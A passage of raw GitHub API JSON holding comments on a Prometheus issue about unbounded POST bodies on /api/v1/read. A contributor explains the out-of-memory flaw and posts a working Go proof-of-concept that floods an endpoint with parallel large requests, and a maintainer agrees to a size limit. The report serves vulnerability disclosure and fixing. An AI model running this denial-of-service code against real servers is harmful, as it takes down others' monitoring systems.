/avatars.githubusercontent.com/u/7115638?v=4","gravatar_id":"","url":"https://api.github.com/users/brian-brazil","html_url":"https://github.com/brian-brazil","followers_url":"https://api.github.com/users/brian-brazil/followers","following_url":"https://api.github.com/users/brian-brazil/following{/other_user}","gists_url":"https://api.github.com/users/brian-brazil/gists{/gist_id}","starred_url":"https://api.github.com/users/brian-brazil/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/brian-brazil/subscriptions","organizations_url":"https://api.github.com/users/brian-brazil/orgs","repos_url":"https://api.github.com/users/brian-brazil/repos","events_url":"https://api.github.com/users/brian-brazil/events{/privacy}","received_events_url":"https://api.github.com/users/brian-brazil/received_events","type":"User","user_view_type":"public","site_admin":false}},{"url":"https://api.github.com/repos/prometheus/prometheus/issues/comments/395524862","html_url":"https://github.com/prometheus/prometheus/issues/4238#issuecomment-395524862","issue_url":"https://api.github.com/repos/prometheus/prometheus/issues/4238","id":395524862,"node_id":"MDEyOklzc3VlQ29tbWVudDM5NTUyNDg2Mg==","user":{"login":"aead","id":20368805,"node_id":"MDQ6VXNlcjIwMzY4ODA1","avatar_url":"https://avatars.githubusercontent.com/u/20368805?v=4","gravatar_id":"","url":"https://api.github.com/users/aead","html_url":"https://github.com/aead","followers_url":"https://api.github.com/users/aead/followers","following_url":"https://api.github.com/users/aead/following{/other_user}","gists_url":"https://api.github.com/users/aead/gists{/gist_id}","starred_url":"https://api.github.com/users/aead/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/aead/subscriptions","organizations_url":"https://api.github.com/users/aead/orgs","repos_url":"https://api.github.com/users/aead/repos","events_url":"https://api.github.com/users/aead/events{/privacy}","received_events_url":"https://api.github.com/users/aead/received_events","type":"User","user_view_type":"public","site_admin":false},"created_at":"2018-06-07T18:45:24Z","updated_at":"2018-06-07T18:45:24Z","body":"Okay, so it's \"just\" an overload/OoM issue:\r\nThe root cause is [L-33](https://github.com/prometheus/prometheus/blob/master/storage/remote/codec.go#L33) where the server reads the entire body of a POST request against `/api/v1/read` into memory. So given an available Prometheus endpoint you can directly write as much data to the server RAM as you want - until the server runs OoM. AFAIK this API is available by default and can be accessed by anyone who can reach the server as long as no other authentication mechanisms are in place.\r\n\r\nOne option to fix this would be to limit the size of the request body (and make the limit configurable if needed) such that a remote \"client\" cannot sent arbitrary amounts of data to the server RAM.  ","author_association":"CONTRIBUTOR","pin":null,"reactions":{"url":"https://api.github.com/repos/prometheus/prometheus/issues/comments/395524862/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"performed_via_github_app":null,"event":"commented","actor":{"login":"aead","id":20368805,"node_id":"MDQ6VXNlcjIwMzY4ODA1","avatar_url":"https://avatars.githubusercontent.com/u/20368805?v=4","gravatar_id":"","url":"https://api.github.com/users/aead","html_url":"https://github.com/aead","followers_url":"https://api.github.com/users/aead/followers","following_url":"https://api.github.com/users/aead/following{/other_user}","gists_url":"https://api.github.com/users/aead/gists{/gist_id}","starred_url":"https://api.github.com/users/aead/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/aead/subscriptions","organizations_url":"https://api.github.com/users/aead/orgs","repos_url":"https://api.github.com/users/aead/repos","events_url":"https://api.github.com/users/aead/events{/privacy}","received_events_url":"https://api.github.com/users/aead/received_events","type":"User","user_view_type":"public","site_admin":false}},{"url":"https://api.github.com/repos/prometheus/prometheus/issues/comments/395527871","html_url":"https://github.com/prometheus/prometheus/issues/4238#issuecomment-395527871","issue_url":"https://api.github.com/repos/prometheus/prometheus/issues/4238","id":395527871,"node_id":"MDEyOklzc3VlQ29tbWVudDM5NTUyNzg3MQ==","user":{"login":"aead","id":20368805,"node_id":"MDQ6VXNlcjIwMzY4ODA1","avatar_url":"https://avatars.githubusercontent.com/u/20368805?v=4","gravatar_id":"","url":"https://api.github.com/users/aead","html_url":"https://github.com/aead","followers_url":"https://api.github.com/users/aead/followers","following_url":"https://api.github.com/users/aead/following{/other_user}","gists_url":"https://api.github.com/users/aead/gists{/gist_id}","starred_url":"https://api.github.com/users/aead/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/aead/subscriptions","organizations_url":"https://api.github.com/users/aead/orgs","repos_url":"https://api.github.com/users/aead/repos","events_url":"https://api.github.com/users/aead/events{/privacy}","received_events_url":"https://api.github.com/users/aead/received_events","type":"User","user_view_type":"public","site_admin":false},"created_at":"2018-06-07T18:55:27Z","updated_at":"2018-06-07T18:55:27Z","body":"A (very simple) proof-of-concept:\r\n```\r\npackage main\r\n\r\nimport (\r\n\t\"flag\"\r\n\t\"fmt\"\r\n\t\"io\"\r\n\t\"log\"\r\n\t\"net/http\"\r\n)\r\n\r\nvar (\r\n\tn int\r\n\ts int64\r\n\tv bool\r\n)\r\n\r\nfunc init() {\r\n\tflag.IntVar(&n, \"n\", 1, \"The number of parallel requests\")\r\n\tflag.Int64Var(&s, \"s\", 16, \"The size of each request body in MB\")\r\n\tflag.BoolVar(&v, \"v\", false, \"Verbose output\")\r\n}\r\n\r\nfunc main() {\r\n\tflag.Parse()\r\n\r\n\targs := flag.Args()\r\n\tif len(args) == 0 {\r\n\t\tlog.Fatalln(\"Missing prometheus endpoint\")\r\n\t}\r\n\tif len(args) > 1 {\r\n\t\tlog.Fatalln(\"Unknown arguments:\", args[1:])\r\n\t}\r\n\tresults := make(chan int64, n)\r\n\tfor i := 0; i < n; i++ {\r\n\t\tgo func(i int) {\r\n\t\t\tr := new(reader)\r\n\t\t\tdefer func() { results <- int64(*r) }()\r\n\r\n\t\t\treq, err := http.NewRequest(\"POST\", args[0]+\"/api/v1/read\", io.LimitReader(r, s*1024*1024))\r\n\t\t\tif err != nil {\r\n\t\t\t\tlog.Fatalf(\"Failed to create the HTTP request: %s\\n\", err)\r\n\t\t\t}\r\n\t\t\t_, err = http.DefaultClient.Do(req)\r\n\t\t\tif err != nil {\r\n\t\t\t\tlog.Fatalf(\"Failed to send the HTTP request: %s\\n\", err)\r\n\t\t\t}\r\n\t\t\tif v {\r\n\t\t\t\tfmt.Printf(\"Request %d: Written %d MB to the server\\n\", i, int64(*r)/(1024*1024))\r\n\t\t\t}\r\n\t\t}(i)\r\n\t}\r\n\tvar written int64\r\n\tfor n > 0 {\r\n\t\twritten += <-results\r\n\t\tn--\r\n\t}\r\n\tfmt.Printf(\"\\nWritten %d MB in total to the server\\n\", written/(1024*1024))\r\n}\r\n\r\ntype reader int64\r\n\r\nfunc (r *reader) Read(p []byte) (int, error) {\r\n\t*r += reader(len(p))\r\n\treturn len(p), nil\r\n}\r\n```","author_association":"CONTRIBUTOR","pin":null,"reactions":{"url":"https://api.github.com/repos/prometheus/prometheus/issues/comments/395527871/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"performed_via_github_app":null,"event":"commented","actor":{"login":"aead","id":20368805,"node_id":"MDQ6VXNlcjIwMzY4ODA1","avatar_url":"https://avatars.githubusercontent.com/u/20368805?v=4","gravatar_id":"","url":"https://api.github.com/users/aead","html_url":"https://github.com/aead","followers_url":"https://api.github.com/users/aead/followers","following_url":"https://api.github.com/users/aead/following{/other_user}","gists_url":"https://api.github.com/users/aead/gists{/gist_id}","starred_url":"https://api.github.com/users/aead/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/aead/subscriptions","organizations_url":"https://api.github.com/users/aead/orgs","repos_url":"https://api.github.com/users/aead/repos","events_url":"https://api.github.com/users/aead/events{/privacy}","received_events_url":"https://api.github.com/users/aead/received_events","type":"User","user_view_type":"public","site_admin":false}},{"url":"https://api.github.com/repos/prometheus/prometheus/issues/comments/395534698","html_url":"https://github.com/prometheus/prometheus/issues/4238#issuecomment-395534698","issue_url":"https://api.github.com/repos/prometheus/prometheus/issues/4238","id":395534698,"node_id":"MDEyOklzc3VlQ29tbWVudDM5NTUzNDY5OA==","user":{"login":"brian-brazil","id":7115638,"node_id":"MDQ6VXNlcjcxMTU2Mzg=","avatar_url":"https://avatars.githubusercontent.com/u/7115638?v=4","gravatar_id":"","url":"https://api.github.com/users/brian-brazil","html_url":"https://github.com/brian-brazil","followers_url":"https://api.github.com/users/brian-brazil/followers","following_url":"https://api.github.com/users/brian-brazil/following{/other_user}","gists_url":"https://api.github.com/users/brian-brazil/gists{/gist_id}","starred_url":"https://api.github.com/users/brian-brazil/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/brian-brazil/subscriptions","organizations_url":"https://api.github.com/users/brian-brazil/orgs","repos_url":"https://api.github.com/users/brian-brazil/repos","events_url":"https://api.github.com/users/brian-brazil/events{/privacy}","received_events_url":"https://api.github.com/users/brian-brazil/received_events","type":"User","user_view_type":"public","site_admin":false},"created_at":"2018-06-07T19:18:47Z","updated_at":"2018-06-07T19:18:47Z","body":"This looks to be possible or equivalent in a few places, Go for example will use 32MB for POST data and then start spilling to disk. For this particular one a hardcoded limit should be fine.","author_association":"CONTRIBUTOR","pin":null,"reactions":{"url":"https://api.github.com/repos/prometheus/prometheus/issues/comments/395534698/reactions","t